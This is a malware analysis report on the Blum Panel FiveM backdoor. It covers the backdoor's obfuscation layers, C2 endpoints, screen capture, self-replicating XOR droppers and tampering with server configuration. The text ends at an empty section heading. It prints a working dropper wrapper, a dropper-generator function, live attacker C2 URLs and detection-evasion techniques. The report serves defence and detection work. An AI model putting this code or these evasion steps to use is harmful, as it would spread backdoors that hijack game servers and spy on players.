# Blum Panel Backdoor — Complete Deobfuscation & Threat Analysis

> **Full reverse-engineering of the Blum Panel (blum-panel.me / warden-panel.me) FiveM backdoor toolkit.**  
> Includes detection scanner, C2 domain blocklist, dropper trap resource, and every deobfuscated source file.

**Attacker:** bertjj / miauss  
**Primary C2:** fivems.lt  
**Attacker Discord:** discord.com/invite/VB8mdVjrzd  
**Analysis Date:** March 2026

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [The Infection Chain](#the-infection-chain)
- [Files Analyzed](#files-analyzed)
- [Obfuscation Architecture](#obfuscation-architecture)
  - [Layer 1: Function() Constructor Wrapper](#layer-1-function-constructor-wrapper)
  - [Layer 2: LZString UTF-16 Compression](#layer-2-lzstring-utf-16-compression)
  - [Layer 3: Base-91 Encoding](#layer-3-base-91-encoding)
  - [Layer 4: Indirection Arrays](#layer-4-indirection-arrays)
  - [Layer 5: Generator State Machines](#layer-5-generator-state-machines)
  - [XOR Dropper Obfuscation](#xor-dropper-obfuscation)
- [The Deobfuscation Process](#the-deobfuscation-process)
- [C2 Infrastructure](#c2-infrastructure)
  - [Primary Endpoints](#primary-endpoints)
  - [Hardcoded Domains (23+)](#hardcoded-domains-23)
  - [Pastebin Fallbacks](#pastebin-fallbacks)
  - [C2 Request Fingerprinting](#c2-request-fingerprinting)
  - [Socket.IO Persistent Connection](#socketio-persistent-connection)
- [Component 1: C2 Loader (main.js)](#component-1-c2-loader-mainjs)
  - [LZString Library Disguise](#lzstring-library-disguise)
  - [C2 Polling Loop](#c2-polling-loop)
  - [Property Obfuscation Mapping](#property-obfuscation-mapping)
- [Component 2: Screen Capture (script.js)](#component-2-screen-capture-scriptjs)
  - [Invisible Canvas Overlay](#invisible-canvas-overlay)
  - [WebGL Shader-Based Capture](#webgl-shader-based-capture)
  - [WebRTC Live Streaming](#webrtc-live-streaming)
  - [LRU Session Management](#lru-session-management)
  - [Chat Message Interception](#chat-message-interception)
- [Component 3: XOR Droppers](#component-3-xor-droppers)
  - [yarn_builder.js](#yarn_builderjs)
  - [webpack_builder.js](#webpack_builderjs)
  - [babel_config.js](#babel_configjs)
  - [Dropper Execution Flow](#dropper-execution-flow)
- [Component 4: The Replicator (c2_payload.txt)](#component-4-the-replicator-c2_payloadtxt)
  - [Payload Structure](#payload-structure)
  - [XOR Dropper Generator](#xor-dropper-generator)
  - [Dropper File Placement](#dropper-file-placement)
  - [fxmanifest.lua Injection](#fxmanifestlua-injection)
  - [server.cfg Injection](#servercfg-injection)
  - [Resource Scanner](#resource-scanner)
  - [The Main Infection Function](#the-main-infection-function)
  - [Embedded Dropper Template](#embedded-dropper-template)
  - [Wildcard Detection](#wildcard-detection)
  - [Framework-Specific Data Extraction](#framework-specific-data-extraction)
- [Component 5: txAdmin Tampering](#component-5-txadmin-tampering)
  - [sv_main.lua — Dashboard Cloaking](#sv_mainlua--dashboard-cloaking)
  - [sv_resources.lua — Server-Side RCE](#sv_resourceslua--server-side-rce)
  - [cl_playerlist.lua — Client-Side RCE](#cl_playerlistlua--client-side-rce)
  - [PerformHttpRequest Hook — Credential Theft](#performhttprequest-hook--credential-theft)
  - [Backdoor Admin Account Creation](#backdoor-admin-account-creation)
- [Anti-Detection Techniques](#anti-detection-techniques)
- [Server Intelligence Gathering](#server-intelligence-gathering)
- [GlobalState Mutex System](#globalstate-mutex-system)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
- [Detection](#detection)
- [Remediation](#remediation)
- [Dropper Trap Resource](#dropper-trap-resource)
- [Blum Panel = Cipher Panel](#blum-panel--cipher-panel-same-operation)
- [C2 Panel Architecture](#c2-panel-architecture-from-frontend-analysis)
- [Discord Bot Module](#discord-bot-module-24-commands)
- [Full Socket.IO Protocol](#full-socketio-protocol-38-on--13-emit)
- [C2 Probe Results](#c2-probe-results-march-14-2026)
- [Financial Intelligence](#financial-intelligence)
- [Infrastructure Summary](#infrastructure-summary)
- [Obfuscation Tool Identified](#obfuscation-tool-identified-jscrambler)
- [Repository Structure](#repository-structure)

---

## Executive Summary

Blum Panel is a commercial FiveM server exploitation toolkit sold as a service through blum-panel.me and warden-panel.me. It provides its customers with persistent remote access to infected FiveM game servers, including live screen viewing of players, arbitrary code execution on both server and client, txAdmin admin panel takeover, and self-replicating malware that spreads to every resource on the server.

The toolkit consists of 8 files working together across 5 components. The initial infection vector is a single JavaScript file (the "dropper") hidden inside a legitimate-looking FiveM resource. Once loaded, the dropper phones home to the attacker's command-and-control server at fivems.lt every 60 seconds, downloading and executing a 1.6MB replication payload that spreads the infection to every other resource on the server, tampers with the txAdmin administration panel to hide the infection and steal credentials, and establishes persistent backdoor access.

All files use the same 5-layer obfuscation architecture, which was fully cracked during this analysis. The obfuscation is mid-tier commercial grade — sophisticated enough to defeat casual inspection but brute-forceable in seconds once the architecture is understood.

The attacker operates under the handles **bertjj**, **bertjjgg**, **bertjjcfxre**, **miausas**, and **miauss**. Their Discord invite link (discord.com/invite/VB8mdVjrzd) is embedded in the dropper code as a fake "contact us" message.

---

## The Infection Chain

The infection follows a 4-stage chain, each stage loading the next:

```
Stage 1: DROPPER (XOR-encrypted .js file)
  ↓ Hidden in: server/modules/babel_config.js, dist/jest_mock.js, etc.
  ↓ Loaded by: fxmanifest.lua server_script or shared_script entry
  ↓ Mechanism: XOR decode → eval()
  
Stage 2: C2 LOADER (main.js, 425KB)
  ↓ Connects to: fivems.lt/bertJJ (primary), bertJJgg, bertJJcfxre (fallbacks)
  ↓ Frequency: Every 60 seconds
  ↓ Mechanism: https.get() → eval() (response is raw JavaScript)
  
Stage 3: REPLICATOR (c2_payload.txt, 1.6MB, memory-only)
  ↓ Never written to disk — lives only in eval() memory
  ↓ Writes XOR droppers into every resource on the server
  ↓ Modifies fxmanifest.lua, server.cfg, and all 3 txAdmin Lua files
  ↓ Establishes Socket.IO WebSocket to C2 for real-time control
  
Stage 4: SCREEN CAPTURE (script.js, 183KB, client-side)
  ↓ Invisible WebGL canvas overlay captures player's screen
  ↓ Streams live to attacker via WebRTC
  ↓ Intercepts private chat messages
```

The replicator (Stage 3) is the critical component — it is the engine that turns a single infected resource into a fully compromised server. Because it is memory-only (delivered via eval from the C2 and never saved to a file), it leaves no direct file artifact. The only evidence of its execution is the files it creates (droppers), the files it modifies (manifests, server.cfg, txAdmin), and the GlobalState mutex it sets (ggWP).

---

## Files Analyzed

| File | Size | Role | Obfuscation |
|------|------|------|-------------|
| `main.js` | 425,385 bytes | Server-side C2 loader | 5-layer (Function + LZString + base-91 × 51 alphabets + aga[419] + 146 generators) |
| `script.js` | 183,078 bytes | Client-side WebRTC screen capture | 5-layer (Function + base-91 × 70 alphabets + _uENFU[276] + 8 generators) |
| `c2_payload.txt` | 1,643,860 bytes | Live replication engine (served by C2) | 4-layer (Function + base-91 × 1 alphabet + UARZT6[3014] + 61 generators) |
| `yarn_builder.js` | 43,368 bytes | XOR dropper (2 blocks, keys 169/189) | XOR cipher |
| `webpack_builder.js` | 631,809 bytes | XOR dropper (34 blocks, various keys) | XOR cipher |
| `babel_config.js` | 20,539 bytes | XOR dropper (1 block, key 204) | XOR cipher |
| `sv_main.lua` | 18,771 bytes | Tampered txAdmin (resource cloaking) | Plaintext injection |
| `sv_resources.lua` | 2,204 bytes | Tampered txAdmin (RCE backdoor) | Plaintext injection |

---

## Obfuscation Architecture

All JavaScript files in the Blum Panel toolkit use the same obfuscation family with 5 distinct layers. The layers are applied in order during obfuscation and must be reversed in the opposite order during deobfuscation. The architecture is consistent across files but differs in specifics (number of alphabets, array sizes, generator counts).

### Layer 1: Function() Constructor Wrapper

The entire payload of each file is encoded as a string argument to the JavaScript `Function()` constructor. This is semantically equivalent to `eval()` but harder to detect with simple pattern matching:

```javascript
// main.js
Function("a", "<425KB of obfuscated code as a string>")({
    get "agv"() { return window },
    get "agy"() { return require },
    set "agy"(v) { return require = v },
    get "agx"() { return exports },
    get "agw"() { return module },
    set "agw"(v) { return module = v },
    get "agz"() { return localPath },
    set "agz"(v) { return localPath = v },
    get "agu"() { return typeof exports }
})

// script.js
Function("tqVTPU", "<183KB string>")({
    get "lf63crD"() { return window }
})

// c2_payload.txt
Function("param", "<1.64MB string>")({
    get "hccX6aj"() { return window },
    get "HzlnSr9"() { return require },
    set "HzlnSr9"(v) { return require = v },
    get "HHpG0Uy"() { return exports },
    get "VR1f_Y"()  { return module },
    set "VR1f_Y"(v) { return module = v },
    get "SBrxiu"()  { return localPath },
    set "SBrxiu"(v) { return localPath = v },
    get "X_qYK_"()  { return typeof exports }
})
```

The getter-based argument object is a key evasion technique. By passing runtime references (`window`, `require`, `module`, `exports`, `localPath`) through getter properties with obfuscated names, these keywords never appear in the code string itself. Static analysis tools looking for `require(` or `module.exports` patterns will find nothing.

**Deobfuscation step:** Strip the `Function()` wrapper to extract the body string. Map the getter property names to their real values.

### Layer 2: LZString UTF-16 Compression

Present only in `main.js` and `script.js` (not in `c2_payload.txt` since it's already delivered via eval and doesn't need to minimize file size).

The master string table for each file is compressed into a Unicode blob using LZString's UTF-16 compression. In main.js, this is a 3,547-character Unicode blob beginning at offset 15426 with the signature character `\u15E1`. When decompressed with `LZString.decompressFromUTF16()`, it yields pipe-delimited encoded strings — 418 strings in main.js, which form the complete lookup table for every meaningful string in the file.

The compressed blob looks like binary garbage in any text editor, which helps evade pattern matching:

```
ĕᗡ㰴㑂㐃...  (3,547 characters of Unicode)
```

After decompression and splitting on `|`, each element is still base-91 encoded (Layer 3).

**Deobfuscation step:** Locate the Unicode blob (search for `\u15E1` or the `decompressFromUTF16` call), decompress it, split on `|` to get the encoded string table.

### Layer 3: Base-91 Encoding

Every meaningful string in the code (function names, API calls, domain names, URLs, error messages) is base-91 encoded. Base-91 is a binary-to-text encoding that uses 91 printable ASCII characters as its alphabet, achieving ~23% better density than base-64.

The critical evasion feature is that each file uses **different alphabets**:

- **main.js:** 51 unique per-scope alphabets. Each local function scope has its own substitution alphabet, meaning the same encoded string decodes to completely different values depending on which decoder function processes it. The primary alphabet is:
  ```
  6|9[&_?.)^}=tB0Gyqb:*~TzCiKdY;+po(OHx82,Dgf7ls1Qe@/VXnNrwcR5APU>"vMES{%ma#FJ4LIZ]<3$j`u!khW
  ```

- **script.js:** 70 unique per-scope alphabets. Even more variation than main.js.

- **c2_payload.txt:** Single alphabet used globally, but with a 22-position rotation applied via a function called `chsp452()`:
  ```
  |w{v9$5(u7AH%:!z?aK;txkDTQ]_BL>80O"<YC&poEZc#+.fP4^Rsyi2/IrW*NXl1S)mbg3e=UMG,@`hnJdV~q[j6}F
  ```

The decode function in c2_payload.txt (`MlBNn_`) is called through a caching wrapper (`a_3q9wj`) which checks a cache array (`mrQuJRF`) before decoding, so each string is only decoded once at runtime. There are 29,853 calls to `a_3q9wj` across the file, operating on 10,318 unique encoded strings stored in the `b1jHO6` array.

**Deobfuscation step:** Extract all alphabets from the decoder functions. Build reverse lookup tables. Decode every encoded string. For main.js/script.js, brute-force across all alphabets — try each alphabet until the decoded output contains valid ASCII/keywords.

### Layer 4: Indirection Arrays

Rather than placing decoded strings directly in the code, all string literals are stored in a central array and referenced by numeric index. This breaks all string-based pattern matching:

- **main.js:** `aga[]` — 419 elements. Many contain hex numbers that serve as secondary indices into the string table, creating multi-hop resolution chains: `aga[0x116]` → `0x128` → string table index 296 → decoded domain fragment.

- **script.js:** `_uENFU[]` — 276 elements. Same principle.

- **c2_payload.txt:** `UARZT6[]` — 3,014 elements containing a mix of hex numbers, short string fragments (single characters, 2-letter combinations like `"fn"`, `"ty"`, `"er"`), booleans (`true`/`false`), and `null`. The short string fragments are used for property access: `UARZT6[0x4]` = `"length"`, `UARZT6[0x14]` = `"push"`, `UARZT6[0x12]` = `"fromCodePoint"`.

Code that originally read:
```javascript
const https = require('https');
```
Becomes:
```javascript
const VHUwgOi = Lgwr1uF(a_3q9wj(UARZT6[0x292]))(a_3q9wj(UARZT6[0x14a]));
```

Where `a_3q9wj(UARZT6[0x292])` decodes to `"require"`, `Lgwr1uF` maps it to the actual `require` function, and `a_3q9wj(UARZT6[0x14a])` decodes to `"https"`.

**Deobfuscation step:** Extract the full array. Resolve all numeric indices to their literal values. Replace every `ARRAY[index]` reference in the code with the resolved value.

### Layer 5: Generator State Machines

All control flow is flattened using JavaScript generator functions (`function*`) with `while(true) switch(state)` patterns. This transforms readable sequential code into opaque state machines where execution flow is determined by runtime state variables:

```javascript
// Original code (readable):
if (response.ok) {
    const data = await response.json();
    processData(data);
} else {
    handleError(response.status);
}

// After generator flattening (obfuscated):
function* _gen_12() {
    while (true) switch (_ctx.next) {
        case 0:
            _ctx.next = response.ok ? 4 : 8;
            break;
        case 4:
            _t0 = response.json();
            _ctx.next = 6;
            return _t0;
        case 6:
            data = _ctx.sent;
            processData(data);
            _ctx.next = 12;
            break;
        case 8:
            handleError(response.status);
            _ctx.next = 12;
            break;
        case 12:
            return _ctx.stop();
    }
}
```

Each `case N:` is a basic block. `_context.next = N` is essentially a `goto`. The state machine maintains 3-4 state variables that are modified at every transition, making static analysis of execution paths extremely difficult without executing the code.

File-specific counts:
- **main.js:** 146 `function*` generators
- **script.js:** 8 generators (simpler control flow)
- **c2_payload.txt:** 61 generators with 74 switch-case state machines

**Deobfuscation step:** Trace each generator's state transitions. Each `case` becomes a sequential code block. `_context.next = N` becomes the next line of code (or a branch if conditional). Reconstruct the original if/else/loop structure.

### XOR Dropper Obfuscation

The dropper files use a simpler, separate obfuscation: a straightforward XOR cipher applied byte-by-byte:

```javascript
(function(){
    const key = 169;  // XOR key (varies per dropper)
    function decode(a, k) {
        var s = '';
        for (var i = 0; i < a.length; i++) {
            s += String.fromCharCode(a[i] ^ k);
        }
        return s;
    }
    const payload = [72,221,156,...];  // XOR-encrypted byte array
    eval(decode(payload, key));
})();
```

Different dropper files use different keys:
- `yarn_builder.js`: Block 1 = key 169, Block 2 = key 189 (both decode to identical payload)
- `babel_config.js`: Key 204
- `webpack_builder.js`: 34 blocks with different keys per block

The decoded payload is always the same C2 loader code that connects to fivems.lt. The variable names in the wrapper (`key`, `decode`, `payload`) are randomized using `Date.now().toString(36)` to avoid signature matching.

---

## The Deobfuscation Process

This section documents the exact methodology used to crack the obfuscation, which can be applied to any file using this architecture.

### Step 1: Strip the Function() Wrapper

Extract the string argument from the `Function()` constructor call. This gives you the raw obfuscated code body. Map the getter property names from the argument object to their real values (`window`, `require`, `exports`, `module`, `localPath`).

### Step 2: Decompress LZString (if present)

Search for the `\u15E1` signature character or a `decompressFromUTF16` function call. If found, extract the Unicode blob and decompress it using the LZString library. Split the result on `|` to get the encoded string table.

For c2_payload.txt, this step is skipped — there is no LZString layer.

### Step 3: Extract the Indirection Array

Locate the large array assignment (search for patterns like `VARNAME=[0x0,0x1,0x8,0xff,"length",...`). Extract all elements. In c2_payload.txt, this is `UARZT6` with 3,014 elements. Build a lookup table mapping index → value.

### Step 4: Extract All Encoded Strings

Locate the encoded string array (in c2_payload.txt: `b1jHO6`, which is assembled from 6 separate array assignments that get concatenated). Extract all encoded string values.

### Step 5: Identify the Decode Function and Alphabet

Find the base-91 decode function. In c2_payload.txt, this is `MlBNn_`, which contains the alphabet string as a local variable. The caching wrapper `a_3q9wj` calls `MlBNn_(b1jHO6[index])` and caches the result in `mrQuJRF`.

For files with multiple alphabets (main.js, script.js), each scope-local decoder function contains its own alphabet. Extract all of them.

### Step 6: Decode All Strings

Implement the base-91 decoder with the extracted alphabet. For single-alphabet files (c2_payload.txt), decode all 10,318 strings in one pass. For multi-alphabet files, brute-force each encoded string against all known alphabets — the correct alphabet produces readable ASCII while wrong alphabets produce garbage.

### Step 7: Resolve All References

Replace every `ARRAY[index]` reference with its resolved literal value. Replace every `decode_function(N)` call with the decoded string. This produces semi-readable code where all strings are visible but control flow is still flattened.

### Step 8: Flatten Generators

Trace each generator's state machine. Convert `case N:` blocks to sequential code. Convert `_context.next = N` to the target block. Reconstruct if/else, loops, and try/catch from the state transitions.

### Step 9: Map Property Obfuscation

Both main.js and script.js use an additional property mapping layer — a switch statement (called `agh` in main.js, `w8qVtr` in script.js) that maps obfuscated property names to real JavaScript globals. For example, in main.js:

| Obfuscated | Real |
|-----------|------|
| `aia6w6` | `Object` |
| `jm8dx1X` | `setTimeout` |
| `fZobvJ` | `Promise` |
| `NtKq08M` | `JSON` |
| `IVdKima` | `String` |
| `YMnx2R` | `setInterval` |
| `HcZdnB` | `console` |
| `iY0Ge1` | `GlobalState` |
| `icECXok` | `setImmediate` |
| `sdUFPj` | `document` |
| `PGy4Ym` | `window` |
| `O1y0di` | `GetCurrentResourceName` |

63 mappings were decoded in main.js, 60 in script.js, 42 global mappings via `Lgwr1uF` in c2_payload.txt.

### Deobfuscation Statistics

| Metric | main.js | script.js | c2_payload.txt |
|--------|---------|-----------|----------------|
| Original size | 425 KB | 183 KB | 1,643 KB |
| Deobfuscated size | 14 KB | 26 KB | 37 KB |
| Base-91 alphabets | 51 | 70 | 1 |
| Indirection array elements | 419 | 276 | 3,014 |
| Encoded strings | 418 | 696 | 10,318 |
| Decode function calls | ~15,000 | ~8,000 | 29,853 |
| Generators | 146 | 8 | 61 |
| Property mappings | 63 | 60 | 42 |

---

## C2 Infrastructure

### Primary Endpoints

The dropper code connects to three endpoints on the primary C2 server, tried in sequence:

| Endpoint | Purpose | Timeout |
|----------|---------|---------|
| `https://fivems.lt/bertJJ` | Primary payload delivery | 10 seconds |
| `https://fivems.lt/bertJJgg` | Fallback #1 | 10 seconds |
| `https://fivems.lt/bertJJcfxre` | Fallback #2 | 10 seconds |

The response from each endpoint is raw JavaScript that gets passed directly to `eval()`. If all three fail, the dropper waits 120 seconds and starts the cycle over. It retries up to 3 complete cycles before backing off.

The endpoint paths are constructed from two variables set in the C2 payload:
```javascript
ende = "bertJJ";         // Attacker handle
back = "https://fivems.lt";  // C2 base URL
```
Endpoint 1: `${back}/${ende}` → `https://fivems.lt/bertJJ`
Endpoint 2: `${back}/${ende}gg` → `https://fivems.lt/bertJJgg`
Endpoint 3: `${back}/${ende}cfxre` → `https://fivems.lt/bertJJcfxre`

### Hardcoded Domains (23+)

main.js contains 23+ hardcoded C2 domains extracted from the LZString-compressed string table. These are assembled from split string fragments to evade pattern matching (e.g., `"5mscri" + "ptss.n" + "et"` → `5mscripts.net`):

```
0xchitado.com        2312321321321213.com    2ns3.net
5mscripts.net        bhlool.com              bybonvieux.com
fivemgtax.com        flowleakz.org           giithub.net (typosquat)
iwantaticket.org     jking.lt                kutingplays.com
l00x.org             monloox.com             noanimeisgay.com
ryenz.net            spacedev.fr             trezz.org
z1lly.org            warden-panel.me         2nit32.com
useer.it.com         wsichkidolu.com
```

Domain status as of March 2026: 16 timed out, 4 dead, 1 parked (`2ns3.net` — this domain is filtered out by the backdoor's own validation logic, suggesting it was once live but has since been abandoned). `fivems.lt` is the only active C2.

### Pastebin Fallbacks

If all hardcoded domains and the primary C2 fail, main.js falls back to 4 Pastebin URLs that can contain updated domain lists:

```
https://pastebin.com/raw/g5iZ1xha
https://pastebin.com/raw/Sm9p9tkm
https://pastebin.com/raw/eViHnPMt
https://pastebin.com/raw/kwW3u4U5
```

All currently return `// Empty`, indicating the campaign is dormant or has rotated to new infrastructure.

### C2 Request Fingerprinting

The C2 server at fivems.lt fingerprints incoming requests and only responds with the payload to Node.js/FiveM server processes. When the payload was captured for this analysis, it required mimicking a Node.js User-Agent:

```
User-Agent: node
Accept: */*
```

Requests from browsers, curl (default headers), PowerShell's `Invoke-WebRequest`, or Python's `requests` library all receive empty responses. This prevents security researchers from easily downloading the payload and prevents browsers from accidentally triggering it.

### Socket.IO Persistent Connection

In addition to the HTTP polling loop, the replicator (c2_payload.txt) establishes a persistent Socket.IO WebSocket connection to the C2 server. This connection:

- Sends a heartbeat every 60 seconds (0xea60 milliseconds)
- Queues events during disconnection and replays them on reconnect
- Maintains a reconnect counter with exponential backoff starting at 500ms
- Provides real-time bidirectional communication for commands (screen capture, RCE, data exfiltration)

The Socket.IO client library is bundled in the first ~1MB of the c2_payload.txt file, along with its dependencies (engine.io, ws, debug, has-flag, supports-color, cookie handling, base-x, SHA-256, UUID, ms, eventemitter, utf8 codec).

---

## Component 1: C2 Loader (main.js)

**Size:** 425,385 bytes → 14,485 bytes deobfuscated  
**Role:** Server-side C2 loader — the first stage of the infection after the dropper

### LZString Library Disguise

main.js exports a **fully functional LZString compression library** as `module.exports`. This is a deliberate evasion technique — anyone reviewing the file sees a legitimate-looking utility library that other resources might depend on. The C2 backdoor runs as an initialization side effect, not as an exported function.

```javascript
module.exports = {
    compressToBase64: function(input) { /* real implementation */ },
    decompressFromBase64: function(input) { /* real implementation */ },
    compressToUTF16: function(input) { /* real implementation */ },
    decompressFromUTF16: function(input) { /* real implementation */ },
    // ... all standard LZString methods
};
```

### C2 Polling Loop

On load, main.js starts a polling loop that:

1. Waits for an initial delay (varies per deployment)
2. Makes an HTTPS GET request to `fivems.lt/bertJJ`
3. If the response looks like valid JavaScript (not HTML, not a Cloudflare error page, not empty), passes it to `eval()`
4. If it fails, tries the two fallback endpoints
5. Schedules the next poll in 60 seconds

The response validation filters out common error responses:
- HTML pages (Cloudflare challenges, parking pages)
- Empty responses
- Error messages from dead domains
- The string `"// Empty"` (returned by dormant Pastebin URLs)

### Property Obfuscation Mapping

main.js uses a 63-entry switch statement (`agh`) that maps obfuscated property names to real JavaScript globals and FiveM natives. This adds an extra layer on top of the base-91 encoding — even after decoding all strings, property accesses still go through this mapping function.

---

## Component 2: Screen Capture (script.js)

**Size:** 183,078 bytes → 26,123 bytes deobfuscated  
**Role:** Client-side screen capture and live streaming to attacker

script.js is the most technically sophisticated component of the toolkit. It runs on the player's game client (not the server) and provides the attacker with live video of the player's screen.

### Invisible Canvas Overlay

The script creates an HTML5 canvas element that is positioned as an invisible overlay on the game screen:
- Canvas dimensions match the game viewport
- Opacity is set to 0 (completely invisible to the player)
- Z-index is set above the game but below UI elements
- The canvas is not added to the normal DOM tree — it's created programmatically and only referenced by the capture code

### WebGL Shader-Based Capture

Rather than using simple `canvas.toDataURL()` (which would be slow and detectable), the script uses **WebGL with custom GLSL shaders** for GPU-accelerated screen capture. This is significantly faster and lower-overhead than CPU-based capture, reducing the chance of the player noticing frame drops.

The GLSL shaders process the raw frame buffer data and output it in a format suitable for WebRTC video encoding.

### WebRTC Live Streaming

The captured frames are streamed to the attacker via WebRTC peer connections:

- Server-side code in the replicator (c2_payload.txt) acts as the signaling relay
- ICE candidates are exchanged through the FiveM event system (`screenshare:clientEvent`)
- The attacker receives a live video stream of the player's screen
- Multiple concurrent viewing sessions are supported

The WebRTC signaling flow:
1. Attacker requests screen view via C2 Socket.IO command
2. Server sends `server:webrtcIce` event to target player
3. Player's client creates RTCPeerConnection and responds with ICE candidates
4. Server relays candidates back to attacker
5. Direct P2P video stream established (or relayed through TURN if needed)

### LRU Session Management

Active screen capture sessions are managed with a Least Recently Used (LRU) cache implemented as a doubly-linked list with O(1) lookup via a Map. When the maximum number of concurrent sessions is reached, the oldest session is evicted (its WebRTC connection is closed and resources are freed). This prevents memory exhaustion on the player's client.

### Chat Message Interception

script.js also hooks into FiveM's `privateChatMap` to intercept private messages between players. Captured messages are exfiltrated via HTTP POST (using the `fetch` API) to the C2 server.

---

## Component 3: XOR Droppers

The droppers are the initial infection vector — they are the files that get planted inside legitimate FiveM resources by the replicator.

### yarn_builder.js

**Size:** 43,368 bytes (clean) → grew to 120,580 bytes during active infection  
**Legitimate content:** A real yarn build task that handles `package.json` processing and `yarn install` execution for FiveM resources.  
**Infection:** Two identical XOR-encrypted backdoor blocks appended after the legitimate code.
- Block 1: XOR key 169, 5,085 bytes
- Block 2: XOR key 189, 5,085 bytes (identical decoded payload — redundancy for resilience)

The file was specifically chosen because `yarn` is a standard FiveM system resource that loads on every server. Injecting into it guarantees execution.

### webpack_builder.js

**Size:** 631,809 bytes  
**Structure:** 34 XOR-encrypted blocks with different keys per block. This is the largest dropper, containing significantly more encrypted payload than the others.

### babel_config.js

**Size:** 20,539 bytes  
**Structure:** Pure dropper with no legitimate code. Single XOR block with key 204. This is the simplest dropper — just the encrypted C2 loader with no cover story.

### Dropper Execution Flow

All droppers follow the same execution pattern once decoded:

1. Wait 15-20 seconds after resource load (evades quick startup scans)
2. Check `GlobalState.miauss` — if already set by another dropper, skip execution (prevents duplicate instances)
3. Set `GlobalState.miauss = GetCurrentResourceName()` (claim the mutex)
4. Register an `onResourceStop` handler to clean up the mutex if the resource is stopped
5. Begin the C2 fetch cycle: try all 3 endpoints, retry up to 3 times, back off 120 seconds on failure
6. On successful fetch: `eval()` the response (this loads the replicator)

The dropper code also contains the attacker's Discord invite link as a comment: `// if you found this contact us to fix problems https://discord.com/invite/VB8mdVjrzd` — a social engineering touch aimed at curious server admins who might find the code.

---

## Component 4: The Replicator (c2_payload.txt)

**Size:** 1,643,860 bytes → 37,269 bytes deobfuscated (960 lines)  
**Role:** The core infection engine — spreads the backdoor to every resource on the server

This is the most important component and the most complex. It is delivered via `eval()` from the C2 server and never touches the filesystem as a standalone file — it exists only in memory. The 1.6MB file breaks down as:

- **Bytes 0–1,060,000:** Bundled JavaScript libraries (socket.io-client, engine.io, ws, debug, has-flag, supports-color, cookie handling, base-x, SHA-256, UUID, ms, eventemitter, utf8 codec)
- **Bytes 1,060,000–1,643,860:** The actual malware replicator code (15 sections)

### Payload Structure

The file has a simple 6-line structure:
```
Line 1: ende = "bertJJ";                    ← Attacker handle variable
Line 2: back = "https://fivems.lt";         ← C2 base URL variable
Line 3: (empty)
Line 4: Function("param","<1.64MB>")({...}) ← The payload
Line 5: const T8hD1nP = true;               ← Execution flag
Line 6: (empty)
```

The `ende` and `back` variables on lines 1-2 are used by the embedded dropper template (Section 13) to construct C2 endpoint URLs. They are set before the Function() call so they're available in the outer scope.

### XOR Dropper Generator

The replicator contains a complete XOR dropper generator that creates new dropper files on the fly:

```javascript
function generateXORDropper(jsPayload, xorKey) {
    // XOR-encode each character of the C2 loader
    const encoded = [];
    for (let i = 0; i < jsPayload.length; i++) {
        encoded.push(jsPayload.charCodeAt(i) ^ xorKey);
    }
    
    // Generate random variable names using Date.now() + Math.random()
    const keyVar = "v" + Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
    const decoderFunc = "d" + Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
    const payloadVar = "p" + Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
    
    // Return self-executing wrapper
    return `(function(){const ${keyVar}=${xorKey};function ${decoderFunc}(a,k){var s='';for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}const ${payloadVar}=[${encoded}];eval(${decoderFunc}(${payloadVar},${keyVar}));})();`;
}
```

Because the variable names include `Date.now()` and `Math.random()`, every generated dropper has unique variable names, defeating simple signature matching. However, the structural pattern (`String.fromCharCode(a[i]^k)`) remains constant and is the primary detection signature.

### Dropper File Placement

The replicator uses two pools for placing dropper files:

**40+ innocent-looking filenames:**
```
env_backup.js      cache_old.js       build_cache.js      vite_temp.js
webpack_bundle.js  babel_config.js    eslint_rc.js        jest_setup.js
test_utils.js      mock_data.js       utils_lib.js        helper_functions.js
config_settings.js runtime_module.js  sync_worker.js      queue_handler.js
session_store.js   event_emitter.js   hook_system.js      patch_update.js
v1_config.js       v2_settings.js     latest_utils.js     stable_core.js
beta_module.js     development.js     production.js       staging.js
testing.js         local_config.js    webpack_chunk.js    vite_plugin.js
babel_preset.js    jest_mock.js       database.js         events.js
commands.js        functions.js       main.js             index.js
app.js             core.js            lib.js
```

**68+ subdirectories to hide in:**
```
html/js            html/scripts       html/assets         html/lib
html/vendor        html/plugins       html/modules
client/lib         client/vendor      client/plugins      client/modules
client/scripts     client/utils       client/helpers
server/utils       server/lib         server/helpers      server/modules
server/plugins
data               config             settings            locales
translations       i18n               temp                tmp
cache              storage            logs
node_modules/internal                 node_modules/.cache
node_modules/.bin
dist               build              public              static
assets             src                libs                vendor
stream             audio              sounds              images
icons              fonts              models              modules
components         services           middleware           controllers
routes             utils              helpers              configs
constants
```

For each target resource, the replicator picks a random directory from the pool, creates it if it doesn't exist, picks a random filename, and writes the XOR-encrypted dropper. The combination of random directory + random filename makes manual discovery extremely tedious.

### fxmanifest.lua Injection

After placing a dropper file, the replicator must ensure FiveM loads it. It does this by injecting a reference into the resource's `fxmanifest.lua`:

1. Reads the manifest file
2. Checks if the dropper path is already present (skip if so)
3. Randomly chooses between `server_scripts` and `shared_scripts` blocks
4. Finds the existing script block (if any)
5. Locates the last entry before the closing brace
6. Adds a comma to the previous line if needed
7. Inserts the dropper path with matching indentation
8. If no script block exists, appends a new one
9. **Restores the original file modification timestamp** using `fs.utimesSync()` to avoid detection

The manifest injection also includes wildcard detection — before injecting, it checks if the manifest already contains patterns like `'**.js'`, `'**/*.js'`, `server/*.js`, etc. that would automatically include the dropper file. If a wildcard already covers the dropper's location, the injection is skipped (unnecessary and would draw attention).

### server.cfg Injection

The replicator modifies `server.cfg` to auto-start infected resources:

1. Reads the file and checks if `ensure <resourceName>` or `start <resourceName>` already exists
2. Skips if the resource is `monitor`, `txadmin`, or `txadminmenu` (these are system resources that would draw attention)
3. Finds all existing `ensure`/`start` lines and their positions
4. **Inserts the new `ensure` line at a random position** among existing entries — not at the end (which would be easy to spot during a review)
5. On Windows: removes hidden/system/readonly file attributes first via `attrib -h -s -r` before writing, then restores them after

### Resource Scanner

The replicator scans for all FiveM resources on the server:

- Starting from `process.cwd()/resources`
- Recursively scans up to 5 levels deep
- Looks for directories containing `fxmanifest.lua`, `__resource.lua`, or `resource.lua`
- Skips `node_modules`, `.git`, `cache`, `temp`, `logs` directories
- Returns an array of all resource paths found

### The Main Infection Function

